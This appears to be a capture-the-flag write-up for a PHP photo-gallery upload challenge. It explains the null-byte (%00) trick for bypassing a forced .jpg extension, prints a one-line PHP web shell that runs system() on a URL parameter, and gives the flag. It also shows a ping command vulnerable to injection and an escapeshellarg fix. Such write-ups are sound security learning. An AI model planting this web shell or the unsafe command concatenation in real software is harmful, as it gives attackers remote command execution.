
##### Challenge Description

Your goal is to hack this photo galery by uploading PHP code.

More info about securing file uploads in PHP :

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf

###### What is a Null Byte (%00) :

A **null byte**, represented as `%00` in URL encoding or `\x00` in hex, is a control character that signifies the end of a string in many programming languages like C and C++.

In security contexts, it is used to perform an injection attack where a malicious string is terminated early, tricking a system into ignoring the characters that follow it (such as a forced `.jpg` extension).

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224150.png)

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224153.png)

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```


Flag : YPNchi2NmTwygr2dgCCF

## WRONG CODE : 

>[!note]
> ```
> $command = "ping -c 3 " . $target_ip;
> ```
> 	Here the ```$target_ip ``` is very dangerous because it allows you to execute any command by following the ip with ; (to execute another command after the first one)


## SOLUTION CODE :

This code wraps the IP in quotes, which means the `ls` command won't be executed as code, but will be treated as a string.

>[!Note]
>``` 
>// SECURE VERSION
$safe_ip = escapeshellarg($target_ip);
